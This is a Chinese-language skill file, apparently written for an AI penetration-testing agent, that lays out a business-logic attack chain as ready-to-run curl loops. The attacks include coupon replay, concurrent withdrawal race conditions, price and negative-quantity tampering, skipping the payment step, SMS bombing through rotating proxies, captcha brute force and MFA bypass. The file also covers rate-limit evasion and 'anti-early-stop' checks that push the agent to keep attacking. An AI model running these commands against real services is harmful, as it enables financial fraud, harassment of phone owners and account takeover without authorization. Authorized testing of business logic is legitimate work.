---
name: business-logic-abuse
description: Business logic vulnerability exploitation covering race conditions, parameter tampering, flow bypass, and financial abuse
version: 1.0.0
---

# 业务逻辑漏洞

## 适用场景

完成技术漏洞扫描后,或在分析业务流程时加载。覆盖流程梳理 → 重放/竞态 → 参数篡改 → 状态跳跃 → 越权 → 价格/数量/负数/溢出 → 短信轰炸 → 验证码绕过 → MFA 绕过完整链。

## 前置 skill

- waf-detection-and-fingerprinting (强制)
- waf-bypass-arsenal (强制)

## 攻击链

### 1) 业务流程梳理

识别关键业务流程:
- 注册 → 登录 → 操作 → 支付 → 确认
- 密码重置流程
- 验证码发送 → 验证流程
- 订单创建 → 支付 → 发货流程
- 优惠券/积分/余额操作流程
- 权限申请 → 审批流程

```bash
# 爬取 + 分析业务端点
katana -u https://TARGET -jc -d 5 -o /tmp/business_endpoints.txt
grep -iE 'order|pay|cart|coupon|point|balance|verify|code|sms|captcha|reset|register|transfer|withdraw|refund' /tmp/business_endpoints.txt
```

### 2) 重放攻击

```bash
# 优惠券重放
curl -sk "https://TARGET/api/coupon/apply" -H "Authorization: Bearer TOKEN" -d '{"coupon_code":"DISCOUNT50"}' -D -

# 多次重放
for i in $(seq 1 10); do
  curl -sk "https://TARGET/api/coupon/apply" -H "Authorization: Bearer TOKEN" -d '{"coupon_code":"DISCOUNT50"}' -o /dev/null -w "Attempt $i: %{http_code}\n"
done
```

### 3) 竞态条件 (Race Condition)

```bash
# 并发提现/转账 (100 并发)
for i in $(seq 1 100); do
  curl -sk "https://TARGET/api/withdraw" -H "Authorization: Bearer TOKEN" -d '{"amount":100}' -o /dev/null -w "%{http_code} " &
done
wait
echo ""

# 并发领取优惠/积分
for i in $(seq 1 100); do
  curl -sk "https://TARGET/api/reward/claim" -H "Authorization: Bearer TOKEN" -o /dev/null -w "%{http_code} " &
done
wait
```

### 4) 参数篡改

```bash
# 价格篡改
curl -sk "https://TARGET/api/order/create" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"product_id":1,"quantity":1,"price":0.01}'

# 数量篡改 (负数)
curl -sk "https://TARGET/api/order/create" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"product_id":1,"quantity":-1,"price":100}'

# 金额溢出
curl -sk "https://TARGET/api/transfer" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"amount":99999999999999}'
curl -sk "https://TARGET/api/transfer" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"amount":-100}'

# 折扣率篡改
curl -sk "https://TARGET/api/order/create" -H "Authorization: Bearer TOKEN" -H "Content-Type: application/json" -d '{"product_id":1,"discount":99.99}'
```

### 5) 状态跳跃

```bash
# 跳过支付直接确认
curl -sk "https://TARGET/api/order/confirm" -H "Authorization: Bearer TOKEN" -d '{"order_id":"ORDER123"}'

# 跳过验证直接操作
curl -sk "https://TARGET/api/password/reset" -H "Authorization: Bearer TOKEN" -d '{"new_password":"pwned123"}'

# 跳过审批直接生效
curl -sk "https://TARGET/api/request/approve" -H "Authorization: Bearer TOKEN" -d '{"request_id":"REQ123"}'
```

### 6) 短信/邮件轰炸

```bash
# 短信验证码轰炸
for i in $(seq 1 20); do
  curl -sk "https://TARGET/api/sms/send" -d '{"phone":"13800138000"}' -o /dev/null -w "%{http_code} "
  sleep 1
done

# 代理版 (绕频率限制)
for i in $(seq 1 20); do
  curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/api/sms/send" -d '{"phone":"13800138000"}' -o /dev/null -w "%{http_code} "
  sleep 2
done
```

### 7) 验证码绕过

```bash
# 验证码置空
curl -sk "https://TARGET/login" -d "username=admin&password=123456&captcha="

# 验证码固定值
curl -sk "https://TARGET/login" -d "username=admin&password=123456&captcha=0000"

# 删除验证码参数
curl -sk "https://TARGET/login" -d "username=admin&password=123456"

# 验证码复用 (同一 session 多次使用)
curl -sk -b "session=SESSION_ID" "https://TARGET/login" -d "username=admin&password=123456&captcha=VALID_CODE"
curl -sk -b "session=SESSION_ID" "https://TARGET/login" -d "username=admin&password=wrong&captcha=VALID_CODE"

# 前端验证绕过 (直接提交不经前端)
curl -sk "https://TARGET/api/login" -H "Content-Type: application/json" -d '{"username":"admin","password":"123456"}'

# 短信验证码爆破 (4-6位)
for code in $(seq -w 0000 9999); do
  curl -sk "https://TARGET/api/verify" -d "phone=13800138000&code=${code}" -o /dev/null -w "%{http_code} ${code}\n" | grep -v "400\|403"
done
```

### 8) MFA 绕过

```bash
# MFA 直接跳过 (删除 MFA 步骤请求)
curl -sk "https://TARGET/api/dashboard" -H "Authorization: Bearer TOKEN_AFTER_PASSWORD"

# MFA 代码重放
curl -sk "https://TARGET/api/mfa/verify" -d '{"code":"123456"}' -H "Authorization: Bearer TOKEN"

# 备用方式绕过
curl -sk "https://TARGET/api/mfa/backup" -d '{"backup_code":"USED_CODE"}' -H "Authorization: Bearer TOKEN"
```

## WAF 对抗集成

业务逻辑漏洞通常不触发 WAF 规则 (请求格式合法),主要挑战:
- 频率限制: 竞态/轰炸场景走代理 + 降速
- 参数篡改被检测: 切 Content-Type / 编码参数

```bash
# 代理版 (频率限制场景)
curl -sk --socks5-hostname <PROXY_USERNAME>:<PROXY_PASSWORD>@<PROXY_HOST>:2000 "https://TARGET/api/sms/send" -d '{"phone":"13800138000"}'
```

## 代理池启用判定

- 竞态/轰炸 → 建议走代理 (频率高)
- 参数篡改/状态跳跃 → 直连 (低频)
- 验证码爆破 → 走代理 (频率高)

## 敏感数据采集点

- 金融类: 订单金额 / 余额变化 / 交易流水
- 业务敏感: 优惠规则 / 风控规则 / 业务流程缺陷
- 账户类: 可越权访问的用户数据

## 失败处理

1. 服务端强校验 → 尝试其他参数组合 / 其他流程节点
2. 频率限制严格 → 走代理 + 降速 + IP 轮换
3. 竞态无效 → 加大并发量 (200-500) / 切工具
4. 验证码复杂 → 放弃爆破,转其他攻击路径
5. 金额校验严格 → 尝试小数 / 边界值 / 特殊字符

## 报告必填字段

- 漏洞标题 / 漏洞指纹 / 完整 PoC
- WAF 类型 + 绕过路径
- 业务影响描述 (财务损失 / 数据泄露 / 服务滥用)
- 重现步骤 (完整流程)
- 影响量化 (可造成的最大损失)
- CVSS 3.1 + 向量串
- 修复建议 / 攻击时间线

## 反早停检查

1. 是否对关键业务流程都做了参数篡改 / 状态跳跃测试?
2. 是否测试了竞态条件 (并发)?
3. 是否尝试了验证码 / MFA 绕过?
